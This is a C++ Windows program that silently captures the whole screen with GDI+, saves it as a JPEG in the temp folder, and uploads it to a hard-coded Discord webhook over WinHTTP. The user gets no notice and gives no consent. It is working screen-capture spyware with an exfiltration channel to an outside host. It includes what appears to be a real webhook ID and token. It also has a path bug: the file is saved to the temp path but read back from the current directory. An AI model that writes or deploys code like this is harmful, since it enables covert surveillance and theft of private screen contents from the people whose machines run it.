#include <windows.h>
#include <gdiplus.h>
#include <winhttp.h>
#include <fstream>
#include <string>
#include <iostream>

#pragma comment(lib, "Gdiplus.lib")
#pragma comment(lib, "winhttp.lib")

using namespace Gdiplus;

// Read entire file into memory
std::string readFileBinary(const std::string &path)
{
    std::ifstream file(path, std::ios::binary);
    return std::string((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
}

// JPG encoder helper
int GetEncoderClsid(const WCHAR *format, CLSID *pClsid)
{
    UINT num = 0, size = 0;
    GetImageEncodersSize(&num, &size);
    if (!size)
        return -1;

    ImageCodecInfo *pImageCodecInfo = (ImageCodecInfo *)malloc(size);
    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT i = 0; i < num; i++)
    {
        if (wcscmp(pImageCodecInfo[i].MimeType, format) == 0)
        {
            *pClsid = pImageCodecInfo[i].Clsid;
            free(pImageCodecInfo);
            return i;
        }
    }

    free(pImageCodecInfo);
    return -1;
}

int main()
{
    //
    // 1) GDI+ Screenshot
    //
    GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, w, h);
    SelectObject(hdcMem, hBitmap);

    BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);

    Bitmap bmp(hBitmap, NULL);
    CLSID jpgClsid;
    WCHAR tempPath[MAX_PATH];
    GetTempPathW(MAX_PATH, tempPath);
    GetEncoderClsid(L"image/jpeg", &jpgClsid);
    std::wstring savePath = std::wstring(tempPath) + L"screenshot.jpg";

    // Save screenshot in temp folder
    bmp.Save(savePath.c_str(), &jpgClsid, NULL);

    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
    GdiplusShutdown(gdiplusToken);

    std::cout << "WORKING.\n";

    //
    // 2) Send to Discord webhook as file
    //
    std::wstring host = L"discord.com";

    // ⚠️ REPLACE THIS:
    // https://discord.com/api/webhooks/1439901313675694141/zsy_iNMhh2csHYhO_RshsN_rYAwOs1u7RplYFlZ23wKRwCxwgWVBYfLZnSIh-mpRSiuD
    std::wstring path = L"/api/webhooks/1439901313675694141/zsy_iNMhh2csHYhO_RshsN_rYAwOs1u7RplYFlZ23wKRwCxwgWVBYfLZnSIh-mpRSiuD";

    std::string fileData = readFileBinary("screenshot.jpg");
    std::string boundary = "----BOUNDARYabc123xyz";

    // Multipart body
    std::string body;

    // Text message part
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"payload_json\"\r\n\r\n";
    body += "{ \"content\": \"Screenshot captured\" }\r\n";

    // File part
    body += "--" + boundary + "\r\n";
    body += "Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.jpg\"\r\n";
    body += "Content-Type: image/jpeg\r\n\r\n";
    body += fileData;
    body += "\r\n--" + boundary + "--\r\n";

    // WinHTTP
    HINTERNET session = WinHttpOpen(
        L"WinHTTP Client",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    HINTERNET connect = WinHttpConnect(session, host.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    HINTERNET request = WinHttpOpenRequest(
        connect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);

    std::wstring headers = L"Content-Type: multipart/form-data; boundary=" +
                           std::wstring(boundary.begin(), boundary.end()) + L"\r\n";

    WinHttpSendRequest(
        request,
        headers.c_str(),
        headers.size(),
        (LPVOID)body.data(),
        body.size(),
        body.size(),
        0);

    WinHttpReceiveResponse(request, NULL);

    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);

    std::cout << "DONE.\n";
    return 0;
}
